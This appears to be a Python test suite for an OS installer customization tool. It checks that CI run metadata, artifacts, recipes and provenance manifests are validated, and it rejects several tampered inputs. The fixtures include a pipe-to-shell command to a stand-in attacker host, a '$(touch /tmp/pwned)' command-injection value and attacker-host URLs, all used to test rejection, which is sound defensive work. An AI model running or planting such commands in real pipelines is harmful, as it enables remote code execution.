from __future__ import annotations

import contextlib
import hashlib
import io
import json
import re
import sys
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from tools.customize.base_build import (  # noqa: E402
    BaseBuildError,
    finish_provenance,
    main,
    package_build_info,
    preserve_provenance,
    validate_files,
    validate_run,
)


REPO = "aarohkandy/v0.0.1-auros"
RUN_ID = 40000000001
HEAD = "a" * 40
AUTHORITY = "f" * 40


def raw_recipe(extra: dict[str, object] | None = None) -> bytes:
    value: dict[str, object] = {
        "schema": "org.auros.recipe",
        "version": 1,
        "base": "desktop",
        "preferences": {"look": "dock", "theme": "moss"},
    }
    if extra:
        value.update(extra)
    return json.dumps(value).encode("utf-8")


def good_run() -> dict[str, object]:
    return {
        "id": RUN_ID,
        "name": "build",
        "path": ".github/workflows/build.yml",
        "event": "push",
        "head_branch": "main",
        "head_sha": HEAD,
        "status": "completed",
        "conclusion": "success",
        "repository": {"full_name": REPO},
    }


def good_artifacts() -> list[dict[str, object]]:
    return [
        {"id": 101, "name": "auros-installer", "expired": False},
        {"id": 102, "name": "auros-base-metadata", "expired": False},
        {"id": 103, "name": "auros-rootfs", "expired": False},
    ]


def request() -> dict[str, object]:
    return validate_run(
        good_run(),
        good_artifacts(),
        repository=REPO,
        run_id=RUN_ID,
        head_sha=HEAD,
        authority_sha=AUTHORITY,
        raw_recipe=raw_recipe(),
    )


class RunValidationTests(unittest.TestCase):
    def test_keeps_authority_separate_from_selected_base_identity(self) -> None:
        result = validate_run(
            good_run(),
            good_artifacts(),
            repository=REPO,
            run_id=RUN_ID,
            head_sha=HEAD,
            authority_sha=AUTHORITY,
            raw_recipe=raw_recipe(),
        )
        self.assertEqual(result["version"], 2)
        self.assertEqual(result["authority"], {"head_sha": AUTHORITY})
        self.assertEqual(result["base_build"]["head_sha"], HEAD)

    def test_accepts_exact_green_main_build_and_fixed_artifact_ids(self) -> None:
        result = request()
        self.assertEqual(result["base_build"]["artifacts"]["installer"]["id"], 101)
        self.assertEqual(result["base_build"]["artifacts"]["metadata"]["id"], 102)
        self.assertEqual(result["authority"], {"head_sha": AUTHORITY})
        self.assertEqual(result["base_build"]["head_sha"], HEAD)
        self.assertEqual(result["recipe"]["resolved_preferences"], {"look": "dock", "theme": "moss"})

    def test_rejects_wrong_run_branch_source_or_conclusion(self) -> None:
        mutations = {
            "run id": {"id": RUN_ID + 1},
            "workflow": {"path": ".github/workflows/tests.yml"},
            "event": {"event": "workflow_dispatch"},
            "branch": {"head_branch": "feature"},
            "checkout": {"head_sha": "b" * 40},
            "status": {"status": "in_progress", "conclusion": None},
            "conclusion": {"conclusion": "failure"},
            "repository": {"repository": {"full_name": "attacker/fork"}},
        }
        for label, change in mutations.items():
            with self.subTest(label=label):
                run = good_run()
                run.update(change)
                with self.assertRaises(BaseBuildError):
                    validate_run(
                        run,
                        good_artifacts(),
                        repository=REPO,
                        run_id=RUN_ID,
                        head_sha=HEAD,
                        authority_sha=AUTHORITY,
                        raw_recipe=raw_recipe(),
                    )

    def test_rejects_missing_duplicate_expired_or_invalid_artifacts(self) -> None:
        cases = [
            good_artifacts()[1:],
            good_artifacts() + [{"id": 104, "name": "auros-installer", "expired": False}],
            [dict(item, expired=True) if item["name"] == "auros-installer" else item for item in good_artifacts()],
            [dict(item, id="101") if item["name"] == "auros-installer" else item for item in good_artifacts()],
        ]
        for artifacts in cases:
            with self.subTest(artifacts=artifacts), self.assertRaises(BaseBuildError):
                validate_run(
                    good_run(),
                    artifacts,
                    repository=REPO,
                    run_id=RUN_ID,
                    head_sha=HEAD,
                    authority_sha=AUTHORITY,
                    raw_recipe=raw_recipe(),
                )

    def test_hostile_recipe_never_becomes_packaging_input(self) -> None:
        attacks = (
            raw_recipe({"command": "curl https://attacker.invalid | sh"}),
            json.dumps(
                {
                    "schema": "org.auros.recipe",
                    "version": 1,
                    "base": "desktop",
                    "preferences": {"look": "$(touch /tmp/pwned)"},
                }
            ).encode(),
            raw_recipe({"base": "office"}),
        )
        for attack in attacks:
            with self.subTest(attack=attack), self.assertRaises(ValueError):
                validate_run(
                    good_run(),
                    good_artifacts(),
                    repository=REPO,
                    run_id=RUN_ID,
                    head_sha=HEAD,
                    authority_sha=AUTHORITY,
                    raw_recipe=attack,
                )


class FileValidationTests(unittest.TestCase):
    def fixture(self, directory: Path) -> tuple[Path, Path]:
        metadata = directory / "metadata"
        metadata.mkdir()
        installer = directory / "AurOS-Setup.exe"
        installer.write_bytes(b"MZ" + b"trusted normal installer" * 20)
        image_sha = "b" * 64
        image_bytes = 6442450944
        tag = "v0.1.0-aaaaaaa"
        pieces = (
            f"# AurOS desktop {tag}, commit {HEAD[:12]}, Actions run {RUN_ID}\n"
            f"base https://github.com/{REPO}/releases/download/{tag}/\n"
            f"piece auros-desktop.img.gz.000 100 {'c' * 64}\n"
            f"piece auros-desktop.img.gz.001 50 {'d' * 64}\n"
        )
        (metadata / "pieces.txt").write_text(pieces, encoding="utf-8")
        (metadata / "image.sha256").write_text(image_sha + "\n", encoding="ascii")
        (metadata / "image.bytes").write_text(str(image_bytes) + "\n", encoding="ascii")
        pieces_sha = hashlib.sha256(pieces.encode()).hexdigest()
        setup_sha = hashlib.sha256(installer.read_bytes()).hexdigest()
        info = (
            f"tag {tag} (os_version 0.1.0, commit {HEAD}, run {RUN_ID})\n"
            f"image {image_bytes} bytes, sha256 {image_sha}; gzip 150 bytes "
            f"(sha256 {'e' * 64}) in 2 pieces\n"
            f"AurOS-Setup.exe {installer.stat().st_size} bytes, sha256 {setup_sha}\n"
            f"pieces.txt {len(pieces.encode())} bytes, sha256 {pieces_sha}\n"
        )
        (metadata / "build-info.txt").write_text(info, encoding="utf-8")
        return metadata, installer

    def test_cross_checks_metadata_piece_url_and_normal_installer(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            metadata, installer = self.fixture(Path(directory))
            provenance = validate_files(request(), metadata, installer)
            self.assertEqual(provenance["state"], "validated-base-pending-unsigned-build")
            self.assertFalse(provenance["signed"])
            self.assertFalse(provenance["download_ready"])
            self.assertEqual(provenance["version"], 2)
            self.assertEqual(provenance["authority"], {"head_sha": AUTHORITY})
            self.assertEqual(provenance["base_build"]["head_sha"], HEAD)

    def test_rejects_changed_commit_hash_size_url_or_installer(self) -> None:
        def mutate_commit(metadata: Path, installer: Path) -> None:
            path = metadata / "build-info.txt"
            path.write_text(path.read_text().replace(HEAD, "f" * 40), encoding="utf-8")

        def mutate_image(metadata: Path, installer: Path) -> None:
            (metadata / "image.bytes").write_text("42\n", encoding="ascii")

        def mutate_tag(metadata: Path, installer: Path) -> None:
            path = metadata / "build-info.txt"
            path.write_text(
                path.read_text().replace("v0.1.0-aaaaaaa", "v9.9.9-fffffff"),
                encoding="utf-8",
            )

        def mutate_pieces(metadata: Path, installer: Path) -> None:
            path = metadata / "pieces.txt"
            path.write_text(path.read_text().replace("github.com", "attacker.invalid"), encoding="utf-8")

        def mutate_installer(metadata: Path, installer: Path) -> None:
            installer.write_bytes(installer.read_bytes() + b"changed")

        for mutation in (
            mutate_commit,
            mutate_image,
            mutate_tag,
            mutate_pieces,
            mutate_installer,
        ):
            with self.subTest(mutation=mutation.__name__), tempfile.TemporaryDirectory() as directory:
                metadata, installer = self.fixture(Path(directory))
                mutation(metadata, installer)
                with self.assertRaises(BaseBuildError):
                    validate_files(request(), metadata, installer)

    def test_finish_keeps_unsigned_and_not_ready_truth(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            metadata, base = self.fixture(Path(directory))
            provenance = validate_files(request(), metadata, base)
            custom = Path(directory) / "AurOS-Setup.exe"
            custom.write_bytes(b"MZcustom")
            finished = finish_provenance(provenance, custom)
            self.assertEqual(finished["state"], "unsigned-custom-artifact")
            self.assertFalse(finished["signed"])
            self.assertFalse(finished["public_release"])
            self.assertFalse(finished["download_ready"])
            self.assertEqual(finished["custom_installer"]["filename"], custom.name)
            info = package_build_info(finished, custom, AUTHORITY, 50000000001)
            self.assertIn(f"commit {AUTHORITY}, run 50000000001", info)
            self.assertIn(f"base tag v0.1.0-aaaaaaa, commit {HEAD}, run {RUN_ID}", info)
            self.assertIn(
                "state unsigned-custom-artifact; not published or download-ready", info
            )

    def test_request_and_pending_provenance_are_fail_closed_v2(self) -> None:
        with tempfile.TemporaryDirectory() as directory_name:
            directory = Path(directory_name)
            metadata, base = self.fixture(directory)
            for mutation in (
                lambda value: value.update({"version": 1}),
                lambda value: value.update({"unknown": True}),
                lambda value: value.pop("authority"),
                lambda value: value["base_build"].update({"unknown": True}),
            ):
                value = request()
                mutation(value)
                with self.subTest(value=value), self.assertRaises(BaseBuildError):
                    validate_files(value, metadata, base)

            pending = validate_files(request(), metadata, base)
            pending["authority"]["unknown"] = True
            custom = directory / "AurOS-Setup.exe"
            custom.write_bytes(b"MZcustom")
            with self.assertRaises(BaseBuildError):
                finish_provenance(pending, custom)


class PreserveProvenanceTests(unittest.TestCase):
    def fixture(self, directory: Path) -> tuple[Path, Path, bytes]:
        metadata, base = FileValidationTests().fixture(directory)
        pending = validate_files(request(), metadata, base)
        custom_dir = directory / "custom"
        custom_dir.mkdir()
        custom = custom_dir / "AurOS-Setup.exe"
        custom.write_bytes(b"MZcustom unsigned installer")
        value = finish_provenance(pending, custom)
        raw = (json.dumps(value, indent=2, sort_keys=False) + "\n").encode("utf-8")
        provenance = directory / "custom-provenance.json"
        provenance.write_bytes(raw)
        return provenance, custom, raw

    def test_preserves_valid_manifest_bytes_exactly(self) -> None:
        with tempfile.TemporaryDirectory() as directory_name:
            directory = Path(directory_name)
            provenance, installer, raw = self.fixture(directory)
            output = directory / "signed" / "custom-provenance.json"
            digest = preserve_provenance(provenance, installer, output)
            self.assertEqual(output.read_bytes(), raw)
            self.assertEqual(digest, hashlib.sha256(raw).hexdigest())

    def test_cli_prints_preserved_manifest_hash(self) -> None:
        with tempfile.TemporaryDirectory() as directory_name:
            directory = Path(directory_name)
            provenance, installer, raw = self.fixture(directory)
            output = directory / "output.json"
            stdout = io.StringIO()
            with contextlib.redirect_stdout(stdout):
                result = main(
                    [
                        "preserve-provenance",
                        "--provenance",
                        str(provenance),
                        "--installer",
                        str(installer),
                        "--output",
                        str(output),
                    ]
                )
            self.assertEqual(result, 0)
            self.assertEqual(stdout.getvalue(), hashlib.sha256(raw).hexdigest() + "\n")
            self.assertEqual(output.read_bytes(), raw)

    def test_rejects_missing_provenance(self) -> None:
        with tempfile.TemporaryDirectory() as directory_name:
            directory = Path(directory_name)
            _provenance, installer, _raw = self.fixture(directory)
            with self.assertRaises(BaseBuildError):
                preserve_provenance(
                    directory / "missing.json", installer, directory / "output.json"
                )

    def test_rejects_tampered_custom_installer_hash_or_size(self) -> None:
        for field, value in (("sha256", "0" * 64), ("bytes", 1)):
            with self.subTest(field=field), tempfile.TemporaryDirectory() as directory_name:
                directory = Path(directory_name)
                provenance, installer, _raw = self.fixture(directory)
                document = json.loads(provenance.read_text(encoding="utf-8"))
                document["custom_installer"][field] = value
                provenance.write_text(json.dumps(document), encoding="utf-8")
                output = directory / "output.json"
                with self.assertRaises(BaseBuildError):
                    preserve_provenance(provenance, installer, output)
                self.assertFalse(output.exists())

    def test_rejects_malformed_recipe_claims(self) -> None:
        mutations = (
            lambda value: value["recipe"].update({"id": "recipe-1"}),
            lambda value: value["recipe"].update({"base": "office"}),
            lambda value: value["recipe"]["resolved_preferences"].update(
                {"look": "$(touch /tmp/pwned)"}
            ),
            lambda value: value["recipe"].update({"untrusted": True}),
        )
        for mutation in mutations:
            with tempfile.TemporaryDirectory() as directory_name:
                directory = Path(directory_name)
                provenance, installer, _raw = self.fixture(directory)
                document = json.loads(provenance.read_text(encoding="utf-8"))
                mutation(document)
                provenance.write_text(json.dumps(document), encoding="utf-8")
                with self.assertRaises(BaseBuildError):
                    preserve_provenance(provenance, installer, directory / "output.json")

    def test_rejects_malformed_base_claims(self) -> None:
        mutations = (
            lambda value: value["base_build"].update({"image_sha256": "bad"}),
            lambda value: value["base_build"].update({"image_bytes": 0}),
            lambda value: value["base_build"].update(
                {"pieces_base": "https://attacker.invalid/pieces/"}
            ),
            lambda value: value["base_build"].update({"tag": "v9.9.9-fffffff"}),
            lambda value: value.update({"repository": "attacker.invalid/repo/path"}),
            lambda value: value["base_build"].update({"opaque": "claim"}),
        )
        for mutation in mutations:
            with tempfile.TemporaryDirectory() as directory_name:
                directory = Path(directory_name)
                provenance, installer, _raw = self.fixture(directory)
                document = json.loads(provenance.read_text(encoding="utf-8"))
                mutation(document)
                provenance.write_text(json.dumps(document), encoding="utf-8")
                with self.assertRaises(BaseBuildError):
                    preserve_provenance(provenance, installer, directory / "output.json")


class WorkflowContractTests(unittest.TestCase):
    def test_workflow_keeps_authority_and_selected_base_inputs_separate(self) -> None:
        workflow = (ROOT / ".github/workflows/customize.yml").read_text(encoding="utf-8")
        for input_name in (
            "authority_sha",
            "base_build_run_id",
            "base_build_sha",
            "base_build_tag",
        ):
            self.assertRegex(
                workflow,
                rf"(?m)^      {input_name}:\n(?:        .*\n)*?        required: true$",
            )
        self.assertIn('[ "$GITHUB_REF" = refs/heads/main ]', workflow)
        self.assertIn('[ "$AUTHORITY_SHA" = "$GITHUB_SHA" ]', workflow)
        validate = workflow.split(
            "python3 tools/customize/base_build.py validate-run", 1
        )[1].split("\n\n", 1)[0]
        self.assertIn('--head-sha "$BASE_BUILD_SHA"', validate)
        self.assertIn('--authority-sha "$GITHUB_SHA"', validate)
        self.assertIn(
            "explicit base_build_tag does not match validated base metadata",
            workflow,
        )
        cross_check = workflow.split(
            "- name: cross-check the archived installer and image metadata", 1
        )[1].split("\n      - name:", 1)[0]
        self.assertRegex(
            cross_check,
            r"(?m)^        env:\n          BASE_BUILD_TAG: \$\{\{ inputs[.]base_build_tag \}\}$",
        )
        finish = workflow.split(
            "python3 tools/customize/base_build.py finish", 1
        )[1].split("\n\n", 1)[0]
        self.assertIn('--source-sha "$GITHUB_SHA"', finish)
        prepare = workflow.split(
            "python3 tools/customize/delivery.py prepare", 1
        )[1].split("\n\n", 1)[0]
        self.assertIn('--source-sha "$GITHUB_SHA"', prepare)
        self.assertNotIn("release-source-sha", workflow)

    def test_extraction_creates_output_directory_before_all_five_resources(self) -> None:
        workflow = (ROOT / ".github/workflows/customize.yml").read_text(encoding="utf-8")
        extraction = workflow.split(
            "- name: extract the exact signed boot resources", 1
        )[1].split("- name: rebuild only the personalized installer", 1)[0]
        self.assertLess(extraction.index("mkdir -p out"), extraction.index("pe_payload.py get"))
        expected = {
            1: "out/auros-staging-vmlinuz",
            2: "out/auros-staging.img",
            3: "out/auros-staging-shimx64.efi",
            4: "out/auros-staging-grubx64.efi",
            5: "out/auros-staging-mmx64.efi",
        }
        for resource_id, output in expected.items():
            self.assertIn(
                f'pe_payload.py get "$base" {resource_id} {output}', extraction
            )


if __name__ == "__main__":
    unittest.main()
